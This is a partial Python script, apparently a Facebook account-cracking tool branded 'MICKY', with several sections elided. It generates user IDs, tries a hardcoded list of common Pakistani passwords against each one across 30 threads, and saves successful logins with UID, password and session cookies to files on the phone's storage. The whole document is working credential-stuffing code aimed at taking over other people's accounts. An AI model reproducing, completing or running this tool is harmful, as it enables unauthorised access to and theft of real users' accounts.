...
if not 'print' in open(king+'sessions.py','r').read():
    ...
    exit('\033[1;32mMicky is Brand Baby🐥🍼')
...
def XXX():
    ...
    if sex in ['1']:
        ...
        XXX()
#__________________PAK DEF____________#
def bd():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 0317{G}/{A}0345{G}/{A}0335{G}/{A}0306');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 2000{G}/{A}3000{G}/{A}5000');linex()
    ...
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'            {R}[{G1}METHOD{R}𒊹︎︎︎{G1}PAK UID{R}]{G1}');linex()
        ...
        for love in user:
            ...
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'786786','iloveu','khankhan','khan12','khan1122','khan786','pakistan','hacker','khan12345','love123','hadi123','nawab12','ayyat123','nadia123','bloach','chaudry','gujjar','rajpoot','roksana','fatima123','tom123','zulfiqar123']
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}MICKY{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}MICKY-OK💚{A}]{G1} {uid} {R}𒊹︎︎︎{G1} {pas}');open('/sdcard/MICKY-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}MICKY-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}MICKY-OK💚{A}]{G1} {ids} {R}𒊹︎︎︎{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/MICKY-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}MICKY-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/MICKY-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
